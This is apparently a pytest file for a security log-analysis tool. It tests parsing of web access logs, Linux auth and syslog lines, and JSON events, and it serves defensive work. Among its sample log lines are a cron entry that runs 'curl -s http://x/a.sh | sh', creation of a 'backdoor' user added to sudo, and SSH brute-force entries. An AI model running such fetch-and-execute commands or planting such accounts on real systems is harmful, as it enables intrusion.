from __future__ import annotations

from datetime import UTC, datetime
from zoneinfo import ZoneInfo

import pytest

from threatlens.normalize.schema import ECS, GENERIC_JSON, LINUX_AUTH, WEBSERVER, LogSource
from threatlens.parsers import (
    FieldMapping,
    ParseContext,
    ParseError,
    UnknownFormatError,
    detect_parser,
    make_parser,
)
from threatlens.parsers.json_lines import EcsJsonParser, GenericJsonParser, parse_timestamp
from threatlens.parsers.linux_auth import LinuxAuthParser
from threatlens.parsers.web_access import WebAccessParser, compile_format
from threatlens.synth import auth_lines, ecs_lines, web_lines

CTX = ParseContext()
T0 = int(datetime(2026, 10, 10, 13, 55, 36, tzinfo=UTC).timestamp() * 1000)


def iso(ms: int) -> str:
    return datetime.fromtimestamp(ms / 1000, UTC).isoformat()


# ---------------------------------------------------------------- web access


COMBINED = (
    '203.0.113.7 - alice [10/Oct/2026:13:55:36 +0000] "GET /a/b.php?id=1%27 HTTP/1.1" 200 2326 '
    '"http://ref.example/" "Mozilla/5.0 (X11)"'
)


def test_combined_line() -> None:
    ev = WebAccessParser().parse(COMBINED, CTX)
    assert ev.ts == T0
    assert ev.logsource == WEBSERVER
    assert ev.fields == {
        "source.ip": "203.0.113.7",
        "user.name": "alice",
        "url.original": "GET /a/b.php?id=1%27 HTTP/1.1",
        "http.request.method": "GET",
        "url.path": "/a/b.php",
        "url.query": "id=1%27",
        "http.version": "1.1",
        "http.response.status_code": 200,
        "http.response.body.bytes": 2326,
        "http.request.referrer": "http://ref.example/",
        "user_agent.original": "Mozilla/5.0 (X11)",
        "event.category": "web",
        "event.dataset": "apache.access",
    }
    assert ev.raw == COMBINED


def test_common_line_and_dash_values() -> None:
    ev = WebAccessParser().parse(
        '198.51.100.1 - - [10/Oct/2026:13:55:36 -0700] "POST /login HTTP/1.0" 401 -', CTX
    )
    assert ev.ts == T0 + 7 * 3600 * 1000
    assert "user.name" not in ev.fields
    assert "http.response.body.bytes" not in ev.fields
    assert ev.fields["http.response.status_code"] == 401


def test_extra_trailing_fields_are_tolerated() -> None:
    ev = WebAccessParser().parse(
        '1.2.3.4 - - [10/Oct/2026:13:55:36 +0000] "GET / HTTP/1.1" 200 5 "-" "curl/8" 0.002 x', CTX
    )
    assert ev.fields["user_agent.original"] == "curl/8"


def test_non_http_request_line_kept_raw() -> None:
    ev = WebAccessParser().parse(
        '1.2.3.4 - - [10/Oct/2026:13:55:36 +0000] "\\x16\\x03\\x01" 400 157 "-" "-"', CTX
    )
    assert ev.fields["url.original"] == "\\x16\\x03\\x01"
    assert "http.request.method" not in ev.fields


def test_escaped_quote_inside_user_agent() -> None:
    line = '1.2.3.4 - - [10/Oct/2026:13:55:36 +0000] "GET / HTTP/1.1" 200 1 "-" "evil \\" agent"'
    assert WebAccessParser().parse(line, CTX).fields["user_agent.original"] == 'evil \\" agent'


@pytest.mark.parametrize(
    "line",
    [
        "not a log line",
        '1.2.3.4 - - [99/Foo/2026:13:55:36 +0000] "GET / HTTP/1.1" 200 1',
        '1.2.3.4 - - [10/Oct/2026:13:55:36 +9999x] "GET / HTTP/1.1" 200 1',
    ],
)
def test_bad_web_lines(line: str) -> None:
    with pytest.raises(ParseError):
        WebAccessParser().parse(line, CTX)


def test_nginx_custom_format() -> None:
    p = WebAccessParser(
        "nginx",
        fmt='$remote_addr - $remote_user [$time_local] "$request" $status $body_bytes_sent '
        '"$http_referer" "$http_user_agent" $request_time $request_id',
    )
    ev = p.parse(
        '9.9.9.9 - bob [10/Oct/2026:13:55:36 +0000] "GET /x?y=1 HTTP/2.0" 404 0 "-" "ua x" '
        "0.120 abc123",
        CTX,
    )
    assert ev.fields["event.duration"] == 120_000_000
    assert ev.fields["http.request.id"] == "abc123"
    assert ev.fields["url.query"] == "y=1"
    assert ev.fields["event.dataset"] == "nginx.access"


def test_apache_custom_format_with_vhost_and_duration() -> None:
    p = WebAccessParser(fmt='%v %a %l %u %t "%r" %>s %B %D "%{X-Forwarded-For}i"')
    ev = p.parse(
        'shop.example 1.1.1.1 - - [10/Oct/2026:13:55:36 +0000] "GET / HTTP/1.1" 200 10 1500 '
        '"10.0.0.1"',
        CTX,
    )
    assert ev.fields["url.domain"] == "shop.example"
    assert ev.fields["event.duration"] == 1_500_000
    assert ev.fields["http.request.headers.x_forwarded_for"] == "10.0.0.1"


def test_presets_and_nginx_iso_time() -> None:
    v = WebAccessParser(fmt="vhost_combined").parse(
        'example.com:443 1.1.1.1 - - [10/Oct/2026:13:55:36 +0000] "GET / HTTP/1.1" 200 10 "-" "u"',
        CTX,
    )
    assert v.fields["destination.port"] == 443
    iso_fmt = WebAccessParser("nginx", fmt='$remote_addr [$time_iso8601] "$request" $status')
    assert iso_fmt.parse('1.1.1.1 [2026-10-10T13:55:36+00:00] "GET / HTTP/1.1" 200', CTX).ts == T0


def test_format_without_fields_rejected() -> None:
    with pytest.raises(ValueError, match="no fields"):
        compile_format("just text")


def test_fractional_seconds_in_time_local() -> None:
    p = WebAccessParser("nginx", fmt='$remote_addr [$time_local] "$request" $status')
    ev = p.parse('1.1.1.1 [10/Oct/2026:13:55:36.250 +0000] "GET / HTTP/1.1" 200', CTX)
    assert ev.ts == T0 + 250


# ---------------------------------------------------------------- linux auth


AUTH_CTX = ParseContext(tz=ZoneInfo("Asia/Dhaka"), reference_time=datetime(2026, 1, 3, tzinfo=UTC))


def auth(line: str) -> dict[str, object]:
    return LinuxAuthParser().parse(line, AUTH_CTX).fields


def test_auth_year_rollover_and_timezone() -> None:
    ev = LinuxAuthParser().parse(
        "Dec 31 23:59:01 web1 sshd[811]: Failed password for invalid user oracle "
        "from 203.0.113.9 port 51234 ssh2",
        AUTH_CTX,
    )
    assert iso(ev.ts) == "2025-12-31T17:59:01+00:00"  # Dhaka is UTC+6, and last year
    assert ev.logsource == LINUX_AUTH
    assert ev.fields["event.action"] == "ssh_login"
    assert ev.fields["event.outcome"] == "failure"
    assert ev.fields["user.name"] == "oracle"
    assert ev.fields["linux.auth.invalid_user"] == "true"
    assert ev.fields["source.port"] == 51234


@pytest.mark.parametrize(
    ("line", "expected"),
    [
        (
            "Jan  2 10:00:00 h sshd[1]: Accepted publickey for alice from 198.51.100.4 port 4 ssh2",
            {
                "event.action": "ssh_login",
                "event.outcome": "success",
                "user.name": "alice",
                "linux.auth.method": "publickey",
            },
        ),
        (
            "Jan  2 10:00:02 h sudo:   bob : 3 incorrect password attempts ; TTY=pts/1 ; "
            "PWD=/tmp ; USER=root ; COMMAND=/bin/bash",
            {
                "event.action": "sudo_command",
                "event.outcome": "failure",
                "event.reason": "3 incorrect password attempts",
                "user.target.name": "root",
            },
        ),
        (
            "Jan  2 10:00:03 h su: pam_unix(su:session): session opened for user root(uid=0) "
            "by alice(uid=1000)",
            {"event.action": "session_opened", "user.name": "alice", "user.target.name": "root"},
        ),
        (
            "Jan  2 10:00:04 h useradd[9]: new user: name=backdoor, UID=1002, GID=1002, "
            "home=/home/backdoor, shell=/bin/bash, from=/dev/pts/0",
            {
                "event.action": "user_created",
                "user.target.name": "backdoor",
                "event.category": "iam",
            },
        ),
        (
            "Jan  2 10:00:05 h usermod[9]: add 'backdoor' to group 'sudo'",
            {"event.action": "user_added_to_group", "group.name": "sudo"},
        ),
        (
            "Jan  2 10:00:06 h CRON[9]: (root) CMD (curl -s http://x/a.sh | sh)",
            {"event.action": "cron_command", "process.command_line": "curl -s http://x/a.sh | sh"},
        ),
        (
            "Jan  2 10:00:07 h sshd[9]: pam_unix(sshd:auth): authentication failure; logname= "
            "uid=0 euid=0 tty=ssh ruser= rhost=203.0.113.9  user=root",
            {
                "event.action": "authentication_failure",
                "source.ip": "203.0.113.9",
                "user.name": "root",
            },
        ),
        (
            "Jan  2 10:00:09 h sshd[9]: Connection closed by authenticating user root "
            "203.0.113.9 port 5555 [preauth]",
            {"event.action": "ssh_disconnect", "user.name": "root"},
        ),
        (
            "Jan  2 10:00:10 h systemd-logind[1]: New session 42 of user alice.",
            {"event.action": "session_opened", "linux.session.id": "42"},
        ),
        (
            "Jan  2 10:00:11 h su: FAILED su for root by mallory",
            {"event.action": "su", "event.outcome": "failure", "user.name": "mallory"},
        ),
        (
            "Jan  2 10:00:12 h passwd[9]: pam_unix(passwd:chauthtok): password changed for bob",
            {"event.action": "password_changed", "user.target.name": "bob"},
        ),
        (
            "Jan  2 10:00:13 h sshd[9]: Did not receive identification string from 192.0.2.1 "
            "port 22",
            {"event.action": "ssh_no_identification", "source.ip": "192.0.2.1"},
        ),
        (
            "Jan  2 10:00:14 h sshd[9]: Invalid user admin from 203.0.113.9 port 4444",
            {"event.action": "ssh_invalid_user", "source.port": 4444},
        ),
        (
            "Jan  2 10:00:15 h groupadd[9]: new group: name=ops, GID=1005",
            {"event.action": "group_created", "group.name": "ops"},
        ),
    ],
)
def test_auth_messages(line: str, expected: dict[str, object]) -> None:
    fields = auth(line)
    for key, value in expected.items():
        assert fields[key] == value, key


def test_unknown_auth_message_is_kept() -> None:
    fields = auth("Jan  2 10:00:00 h kernel: something unrelated happened")
    assert fields["message"] == "something unrelated happened"
    assert fields["process.name"] == "kernel"
    assert "event.action" not in fields


def test_iso_and_rfc5424_headers() -> None:
    ev = LinuxAuthParser().parse(
        "2026-01-02T10:00:01.123456+00:00 web1 sudo:   alice : TTY=pts/0 ; PWD=/home/alice ; "
        "USER=root ; COMMAND=/usr/bin/id",
        AUTH_CTX,
    )
    assert iso(ev.ts) == "2026-01-02T10:00:01.123000+00:00"
    f = auth("<38>1 2026-01-02T10:00:08Z web1 sshd 904 - - Invalid user admin from 1.2.3.4 port 4")
    assert f["log.syslog.facility.code"] == 4
    assert f["log.syslog.severity.code"] == 6
    assert f["process.pid"] == 904


@pytest.mark.parametrize(
    "line", ["garbage", "Foo 99 10:00:00 h sshd[1]: x", "Feb 30 10:00:00 h sshd[1]: x"]
)
def test_bad_auth_lines(line: str) -> None:
    with pytest.raises(ParseError):
        LinuxAuthParser().parse(line, AUTH_CTX)


# ---------------------------------------------------------------- JSON


def test_ecs_nested_and_dotted() -> None:
    ev = EcsJsonParser().parse(
        '{"@timestamp":"2026-10-10T13:55:36Z","http.request.method":"GET",'
        '"source":{"ip":"1.2.3.4"},"event":{"category":["web"]},"labels":{}}',
        CTX,
    )
    assert ev.ts == T0
    assert ev.logsource == ECS
    assert ev.fields["source.ip"] == "1.2.3.4"
    assert ev.fields["http.request.method"] == "GET"
    assert ev.fields["event.category"] == ["web"]
    assert "@timestamp" not in ev.fields


@pytest.mark.parametrize(
    "line", ['{"message": "no timestamp"}', "[1, 2]", "{not json", '{"@timestamp": "yesterday"}']
)
def test_bad_ecs_lines(line: str) -> None:
    with pytest.raises(ParseError):
        EcsJsonParser().parse(line, CTX)


def test_generic_json_auto_timestamp() -> None:
    ev = GenericJsonParser().parse('{"ts": 1791641736, "client": "1.2.3.4", "a": {"b": 1}}', CTX)
    assert ev.ts == 1791641736000
    assert ev.logsource == GENERIC_JSON
    assert ev.fields["a.b"] == 1
    with pytest.raises(ParseError, match="no timestamp"):
        GenericJsonParser().parse('{"x": 1}', CTX)


MAPPING = """
name: myapp
logsource: {product: myapp, service: api}
timestamp: {field: when, format: "%d/%m/%Y %H:%M:%S", timezone: Asia/Dhaka}
fields:
  client.addr: source.ip
  req.verb: http.request.method
keep_unmapped: false
constants:
  event.category: web
"""


def test_mapping_file() -> None:
    m = FieldMapping.from_yaml(MAPPING)
    assert m.logsource == LogSource(product="myapp", service="api")
    assert m.logsource.table_name == "ev_myapp_api"
    ev = GenericJsonParser(m).parse(
        '{"when": "10/10/2026 19:55:36", "client": {"addr": "9.9.9.9"}, "req": {"verb": "PUT"},'
        ' "noise": 1}',
        CTX,
    )
    assert ev.ts == T0
    assert ev.fields == {
        "source.ip": "9.9.9.9",
        "http.request.method": "PUT",
        "event.category": "web",
        "event.dataset": "myapp",
    }
    with pytest.raises(ParseError, match="missing"):
        GenericJsonParser(m).parse('{"other": 1}', CTX)


@pytest.mark.parametrize(
    ("doc", "message"),
    [
        ("- a list", "YAML mapping"),
        ("bogus: 1", "unknown mapping keys"),
        ("logsource: {vendor: x}", "logsource"),
        ("fields: {a: 1}", "fields must map"),
        ("timestamp: [1]", "timestamp must be"),
        ("timestamp: {field: t, timezone: Nowhere/City}", "Nowhere"),
        ("constants: [1]", "constants"),
        ("key: [unclosed", "not valid YAML"),
    ],
)
def test_invalid_mappings(doc: str, message: str) -> None:
    with pytest.raises(ValueError, match=message):
        FieldMapping.from_yaml(doc)


@pytest.mark.parametrize(
    ("value", "fmt", "expected"),
    [
        (1791641736, "epoch_s", 1791641736000),
        ("1791641736000", "epoch_ms", 1791641736000),
        (1791641736000000, "epoch_us", 1791641736000),
        (1791641736000000000, "epoch_ns", 1791641736000),
        (1791641736000, "epoch", 1791641736000),
        ("2026-10-10 13:55:36", "iso8601", T0),
        ("2026-10-10T13:55:36.123456789Z", "auto", T0 + 123),
        ("1791641736.5", "auto", 1791641736500),
    ],
)
def test_timestamp_formats(value: object, fmt: str, expected: int) -> None:
    assert parse_timestamp(value, fmt, UTC) == expected


def test_bad_timestamp_value() -> None:
    with pytest.raises(ParseError):
        parse_timestamp("not-a-number", "epoch_s", UTC)


# ---------------------------------------------------------------- detection


@pytest.mark.parametrize(
    ("lines", "name"),
    [
        (list(web_lines(30, seed=3)), "apache"),
        (list(auth_lines(30, seed=3)), "linux-auth"),
        (list(ecs_lines(30, seed=3)), "ecs-json"),
        (['{"time": "2026-01-01T00:00:00Z", "msg": "x"}'] * 5, "json"),
    ],
)
def test_detect_parser(lines: list[str], name: str) -> None:
    assert detect_parser(lines, CTX).name == name


def test_detect_parser_unknown_and_empty() -> None:
    with pytest.raises(UnknownFormatError, match="could not recognise"):
        detect_parser(["hello world"] * 10, CTX)
    with pytest.raises(UnknownFormatError, match="no lines"):
        detect_parser(["   "], CTX)


def test_detect_parser_with_mapping_and_make_parser() -> None:
    m = FieldMapping.from_yaml(MAPPING)
    assert isinstance(detect_parser(["{}"], CTX, mapping=m), GenericJsonParser)
    assert make_parser("nginx").name == "nginx"
    assert make_parser("linux-auth").name == "linux-auth"
    assert make_parser("ecs-json").name == "ecs-json"
    with pytest.raises(ValueError, match="unknown parser"):
        make_parser("windows")


def test_synthetic_generators_are_deterministic() -> None:
    assert list(web_lines(50, seed=9)) == list(web_lines(50, seed=9))
    assert list(web_lines(50, seed=9)) != list(web_lines(50, seed=10))
    parser = WebAccessParser()
    assert all(parser.parse(line, CTX) for line in web_lines(500, seed=2))
    auth = LinuxAuthParser()
    ctx = ParseContext(reference_time=datetime(2026, 1, 6, tzinfo=UTC))
    assert all(auth.parse(line, ctx) for line in auth_lines(500, seed=2))
    ecs = EcsJsonParser()
    assert all(ecs.parse(line, CTX) for line in ecs_lines(500, seed=2))
